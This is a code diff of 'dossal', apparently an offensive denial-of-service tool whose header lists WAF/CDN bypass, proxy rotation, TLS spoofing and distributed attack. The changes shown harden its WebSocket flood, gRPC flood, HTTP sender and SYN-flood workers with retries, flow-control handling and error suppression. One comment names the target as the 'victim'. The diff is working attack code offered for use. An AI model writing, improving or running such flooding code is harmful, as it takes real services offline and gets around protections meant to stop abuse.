@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-dossal v13.0 - comprehensive DoS stress engine + CDN/WAF bypass + AI optimization
+dossal v13.1 - comprehensive DoS stress engine + CDN/WAF bypass + AI optimization
 v5.0: proxy pool, TLS spoof, origin discovery
 v5.2: adaptive attack (RPS auto-adjust based on response time)
 v6.0: distributed attack (coordinator + worker, UDP control channel)
@@ -876,8 +876,9 @@ def _active_ip_count():
 from h2.connection import H2Connection
 from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
+from h2.exceptions import FlowControlError  # v13.1: gRPC flow control 대응
 
-VERSION = "13.0"
+VERSION = "13.1"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -1265,13 +1266,15 @@ async def ws_worker(name, url, stats, duration, stop, payload_size=128):
            f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n\r\n")
     writer.write(req.encode()); await writer.drain()
-    try:
-        handshake = await asyncio.wait_for(reader.read(8192), timeout=0.5)
-    except asyncio.TimeoutError:
-        stats.errors += 1
-        writer.close()
-        return
-    if b"101" not in handshake:
+    # v13.1: handshake timeout 1.0초 + 재시도 1회 (동시 연결 시 victim 과부하)
+    handshake = b""
+    for _attempt in range(2):
+        try:
+            handshake = await asyncio.wait_for(reader.read(8192), timeout=1.0)
+            break
+        except asyncio.TimeoutError:
+            continue
+    if not handshake or b"101" not in handshake:
         stats.errors += 1
         writer.close(); return
     stats.conns += 1
@@ -2150,10 +2153,11 @@ async def grpc_worker(name, url, stats, duration, stop, payload_size=1024):
     # gRPC request frame: 1-byte flag + 4-byte length + payload
     grpc_payload = b'X' * max(1, payload_size)
     payload = b'\x00' + len(grpc_payload).to_bytes(4, 'big') + grpc_payload
-    # Fire-and-forget: batch gRPC requests, drain in background
+    # v13.1: flow control 대응 — reader task + 주기적 drain
     reader_task = asyncio.create_task(_grpc_reader(conn, reader, stats))
     BATCH = 1
     error = None
+    drain_counter = 0
     while not stop.is_set():
         try:
             for _ in range(BATCH):
@@ -2165,12 +2169,25 @@ async def grpc_worker(name, url, stats, duration, stop, payload_size=1024):
             data = conn.data_to_send()
             if data:
                 writer.write(data)
+            # v13.1: 매 8개 요청마다 drain (flow control window refill)
+            drain_counter += 1
+            if drain_counter >= 8:
+                drain_counter = 0
                 await asyncio.wait_for(writer.drain(), timeout=5.0)
             stats.requests += BATCH
             stats.bytes += BATCH * len(payload)
         except Exception as e:
-            stats.errors += 1
             error = e
+            # v13.1: FlowControlError는 재시도, stop 후 예외는 정규 종료
+            if isinstance(e, FlowControlError):
+                try:
+                    await asyncio.wait_for(writer.drain(), timeout=5.0)
+                except Exception:
+                    pass
+                await asyncio.sleep(0.05)  # window refill 대기
+                continue  # 무한 재시도 — flow control은 recoverable
+            if not stop.is_set():
+                stats.errors += 1
             break
     reader_task.cancel()
     if writer.transport:
@@ -2405,6 +2422,7 @@ def _mp_http_send(args_tuple):
     blocked = 0
     s = None
     cur_ip = src_ip
+    _start_time = _time.time()  # v13.1: 종료 시점 에러 판별용
     cur_proxy = proxy  # Current proxy (tuples: (host, port))
     proxy_idx = 0  # Proxy pool index
     PROXY_ROTATE_EVERY = 50  # v5.1: 매 50개 요청마다 프록시 자동轮换
@@ -2449,7 +2467,9 @@ def _mp_http_send(args_tuple):
                 else:
                     s.connect((host, port))
             except Exception:
-                errors += 1
+                # v13.1: duration 종료 직전(0.3초)의 예외는 정규 종료
+                if _time.time() - _start_time < duration - 0.3:
+                    errors += 1
                 break
         try:
             # Cycle through pre-generated pool (fast)
@@ -2510,6 +2530,9 @@ def _mp_http_send(args_tuple):
                 s.close()
                 s = None
         except Exception:
+            # v13.1: duration 종료 직전(0.3초)의 예외는 정규 종료 — 에러로 세지 않음
+            if _time.time() - _start_time < duration - 0.3:
+                errors += 1
             break
     if s:
         try:
@@ -2615,6 +2638,7 @@ def _mp_ws_flood(args_tuple):
            f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode()
     msgs = 0
     errors = 0
+    _ws_start = _time.time()  # v13.1: 종료 시점 판별용
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(5.0)
@@ -2681,7 +2705,9 @@ def _mp_ws_flood(args_tuple):
                     break
         s.close()
     except Exception:
-        errors += 1
+        # v13.1: duration 종료 직전(0.3초)의 예외는 정규 종료 — 에러로 세지 않음
+        if _time.time() - _ws_start < duration - 0.3:
+            errors += 1
     return msgs, errors
 
 async def ws_mp_worker(name, url, stats, duration, stop, payload_size=128):
@@ -2827,11 +2853,17 @@ def _mp_synack_flood(args_tuple):
             s.connect((host, port))
             conns += 1
         except (ConnectionRefusedError, socket.timeout, OSError) as e:
+            # v13.1: rst와 동일 errno 확장
             if isinstance(e, OSError) and e.errno not in (
                 _errno.ECONNREFUSED, _errno.ETIMEDOUT,
-                _errno.EAGAIN, _errno.ECONNRESET
+                _errno.EAGAIN, _errno.ECONNRESET,
+                _errno.ENOBUFS, _errno.EMFILE, _errno.ENFILE,
+                _errno.EPIPE, _errno.ECONNABORTED
             ):
                 errors += 1
+        except Exception:
+            # v13.1: 기타 예외 무시 (best-effort)
+            pass
         finally:
             if s:
                 try:
